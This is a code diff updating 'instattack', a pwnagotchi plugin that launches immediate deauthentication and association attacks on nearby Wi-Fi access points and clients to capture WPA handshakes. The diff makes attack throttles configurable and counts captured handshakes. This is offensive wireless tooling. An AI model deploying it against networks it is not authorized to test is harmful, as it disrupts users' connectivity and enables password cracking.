@@ -4,7 +4,7 @@ import pwnagotchi.plugins as plugins
 
 class instattack(plugins.Plugin):
     __author__ = '129890632+Sniffleupagus@users.noreply.github.com'
-    __version__ = '1.0.0'
+    __version__ = '1.1.0'
     __license__ = 'GPL3'
     __description__ = 'Pwn more aggressively. Launch immediate associate or deauth attack when bettercap spots a device.'
 
@@ -13,6 +13,7 @@ class instattack(plugins.Plugin):
         self._agent = None
         self.old_name = None
         self.recents = {}
+        self.stats = { "insta_h":0, "regular_h":0 }
 
     # called before the plugin is unloaded
     def on_unload(self, ui):
@@ -39,7 +40,9 @@ class instattack(plugins.Plugin):
     def on_ready(self, agent):
         self._agent = agent
         logging.info("instattack attack!")
-        agent.run("wifi.clear")
+        if self.options.get("clear_on_start", True):
+            # empty bettercap wifi memory, so all nearby APs are "new" again
+            agent.run("wifi.clear")
         if self._ui:
             self._ui.set("status", "Be aggressive!\nBE BE AGGRESSIVE!")
 
@@ -70,7 +73,7 @@ class instattack(plugins.Plugin):
             ap = event['data']
             if agent._config['personality']['associate'] and self.ok_to_attack(ap):
                 logging.debug("insta-associate: %s (%s)" % (ap['hostname'], ap['mac']))
-                agent.associate(ap, 0.3)
+                agent.associate(ap, self.options.get("throttle_a", 0.3))
         except Exception as e:
             logging.error(repr(e))
 
@@ -81,21 +84,26 @@ class instattack(plugins.Plugin):
             if agent._config['personality']['deauth'] and self.ok_to_attack(ap) and self.ok_to_attack(cl):
                 logging.debug("insta-deauth: %s (%s)->'%s'(%s)(%s)" % (ap['hostname'], ap['mac'],
                                                                       cl['hostname'], cl['mac'], cl['vendor']))
-                agent.deauth(ap, cl, 0.75)
+                agent.deauth(ap, cl, self.options.get("throttle_d", 0.75))
         except Exception as e:
             logging.error(repr(e))
 
     def on_handshake(self, agent, filename, ap, cl):
-        logging.info("insta-shake? %s" % ap['mac'])
+        # determine if this handshake was due to instattack or just from regular attacks
+        logging.debug("insta-shake? %s" % ap['mac'])
         if 'mac' in ap and 'mac' in cl:
             amac = ap['mac'].lower()
             cmac = cl['mac'].lower()
             if amac in self.recents:
-                logging.info("insta-shake!!! %s (%s)->'%s'(%s)(%s)" % (ap['hostname'], ap['mac'],
-                                                                       cl['hostname'], cl['mac'], cl['vendor']))
+                logging.info("insta-shake (%d/%d)!!! %s (%s)->'%s'(%s)(%s)" % (self.stats['insta_h'], self.stats['regular_h'],
+                                                                               ap['hostname'], ap['mac'],
+                                                                               cl['hostname'], cl['mac'], cl['vendor']))
+                self.stats['insta_h'] += 1
                 del self.recents[amac]
                 if cmac in self.recents:
                     del self.recents[cmac]
+            else:
+                self.stats['regular_h'] += 1
 
     def on_epoch(self, agent, epoch, epoch_data):
         for mac in self.recents:
